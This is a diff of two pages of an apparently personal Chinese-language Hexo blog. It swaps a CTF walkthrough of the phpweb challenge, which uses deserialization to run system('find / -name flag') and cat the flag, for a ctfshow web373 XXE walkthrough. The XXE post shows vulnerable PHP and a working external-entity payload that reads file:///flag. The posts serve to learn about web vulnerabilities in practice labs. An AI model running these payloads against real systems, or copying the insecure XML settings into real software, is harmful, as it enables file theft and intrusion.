@@ -5,27 +5,19 @@
   
 
   
-  <title>代码审计1 | Hexo</title>
+  <title>xxe漏洞2 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="又是长见识的一道题buu的[网鼎杯 2020 朱雀组]phpweb，打开靶场，发现了&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php这串代码，那就添加到url上，发现有个页面一闪而过，burp抓包  发现有post了两个参数func和p，不知道他们有什么联系，就用md5来试试  在回显的页面上发现了md5（123）的值，所以可以确定是func（p）这样的形式，那就用file_get_contents">
+  <meta name="description" content="继续xxe的学习，今天的靶场是来自于ctfshow的web373 打开靶场，发现如下代码 123456789101112131415&#x2F;&#x2F; 允许加载外部实体libxml_disable_entity_loader(false);&#x2F;&#x2F; xml文件来源于数据流$xmlfile &#x3D; file_get_contents(&amp;#x27;php:&#x2F;&#x2F;input&amp;#x27;);if(isset($xmlfile))">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计1">
-<meta property="og:url" content="http://example.com/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:title" content="xxe漏洞2">
+<meta property="og:url" content="http://example.com/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="又是长见识的一道题buu的[网鼎杯 2020 朱雀组]phpweb，打开靶场，发现了&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php这串代码，那就添加到url上，发现有个页面一闪而过，burp抓包  发现有post了两个参数func和p，不知道他们有什么联系，就用md5来试试  在回显的页面上发现了md5（123）的值，所以可以确定是func（p）这样的形式，那就用file_get_contents">
+<meta property="og:description" content="继续xxe的学习，今天的靶场是来自于ctfshow的web373 打开靶场，发现如下代码 123456789101112131415&#x2F;&#x2F; 允许加载外部实体libxml_disable_entity_loader(false);&#x2F;&#x2F; xml文件来源于数据流$xmlfile &#x3D; file_get_contents(&amp;#x27;php:&#x2F;&#x2F;input&amp;#x27;);if(isset($xmlfile))">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/4ccf26a02b0c4c07b02ffe9d276a7017.png">
-<meta property="og:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180202860.png">
-<meta property="og:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180645656.png">
-<meta property="og:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180805131.png">
-<meta property="og:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/d4b1b39dbf394072a5e5f7dcc0a39b29.png">
-<meta property="og:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180930400.png">
-<meta property="og:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/c7d1fbbd647f41fcbc34aa065f13bf85.png">
-<meta property="article:published_time" content="2022-08-27T09:26:30.000Z">
-<meta property="article:modified_time" content="2022-08-27T10:11:02.626Z">
+<meta property="article:published_time" content="2022-09-04T08:40:48.000Z">
+<meta property="article:modified_time" content="2022-09-04T16:08:36.905Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/hkzooz/zooz/raw/master/img/4ccf26a02b0c4c07b02ffe9d276a7017.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -74,14 +66,14 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-代码审计" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-xxe漏洞2" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
-  <time datetime="2022-08-27T09:26:30.000Z" itemprop="datePublished">2022-08-27</time>
+    <a href="/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/" class="article-date">
+  <time datetime="2022-09-04T08:40:48.000Z" itemprop="datePublished">2022-09-04</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    <a class="article-category-link" href="/categories/xxe/">xxe</a>
   </div>
 
   </div>
@@ -92,7 +84,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      代码审计1
+      xxe漏洞2
     </h1>
   
 
@@ -100,26 +92,19 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>又是长见识的一道题buu的[网鼎杯 2020 朱雀组]phpweb，打开靶场，发现了/var/www/html/index.php这串代码，那就添加到url上，发现有个页面一闪而过，burp抓包</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/4ccf26a02b0c4c07b02ffe9d276a7017.png" alt="img"></p>
-<p>发现有post了两个参数func和p，不知道他们有什么联系，就用<strong>md5</strong>来试试</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180202860.png" alt="image-20220827180202860"></p>
-<p>在回显的页面上发现了md5（123）的值，所以可以确定是func（p）这样的形式，那就用<strong>file_get_contents或者highlight_flie来读取下index.php</strong></p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180645656.png" alt="image-20220827180645656"></p>
-<p>回显了这么一串代码，审计一下，发现可以利用test类反序列化来使页面返回想要的结果，那就试试反序列化</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180805131.png" alt="image-20220827180805131"></p>
-<p>得到返回结果</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/d4b1b39dbf394072a5e5f7dcc0a39b29.png" alt="在这里插入图片描述"></p>
-<p>那就直接<strong>system(“find / -name flag”)：查找所有文件名匹配flag的文件</strong></p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/image-20220827180930400.png" alt="image-20220827180930400"></p>
-<p>得到以下返回结果</p>
-<p><img src="https://gitee.com/hkzooz/zooz/raw/master/img/c7d1fbbd647f41fcbc34aa065f13bf85.png" alt="在这里插入图片描述"></p>
-<p>最后再cat tmp/flag。。。就得到flag了</p>
+        <p>继续xxe的学习，今天的靶场是来自于ctfshow的web373</p>
+<p>打开靶场，发现如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 允许加载外部实体</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// xml文件来源于数据流</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">  	<span class="comment">// 加载xml实体，参数为替代实体、加载外部子集</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  	<span class="comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">  	<span class="comment">// 节点嵌套</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>火狐直接post传入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE am [</span><br><span class="line"> &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;admin;&lt;/ctfshow&gt;           &lt;!--上面的节点转换和节点嵌套定义了xml的标签--&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-id="cl7gcvvoz0005ks0q00ia2ojs" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/" data-id="cl7oqqg4w00021kdqbvpy6wkt" class="article-share-link">Share</a>
       
       
     </footer>
@@ -128,19 +113,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2022/08/28/unserialize1/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          unserialize1
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/08/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2022/09/04/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">文件包含1</div>
+      <div class="article-nav-title">js学习笔记（一）</div>
     </a>
   
 </nav>
